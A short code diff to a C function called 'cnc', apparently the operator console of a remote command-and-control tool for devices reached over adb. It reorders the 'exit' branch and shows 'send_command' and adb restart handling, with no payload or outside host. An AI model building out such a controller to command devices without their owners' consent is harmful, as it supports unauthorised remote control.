@@ -326,9 +326,7 @@ void cnc(int fd) {
 		
 		while ((shell[w_buf++] = getchar()) != '\n');
 		
-		if (strncmp("exit", shell, 4) == 0) {
-			break;
-		} else if (strncmp("send_command", shell, 12) == 0) {
+		if (strncmp("send_command", shell, 12) == 0) {
 			k = 0;
 			
 			char data_send[1024];
@@ -383,6 +381,8 @@ void cnc(int fd) {
 		} else if (strncmp("restart", shell, 7) == 0) {
 			system("adb kill-server");
 			system("adb start-server");
+		} else if (strncmp("exit", shell, 4) == 0) {
+			break;
 		} else {
 			handler(shell);
 		}
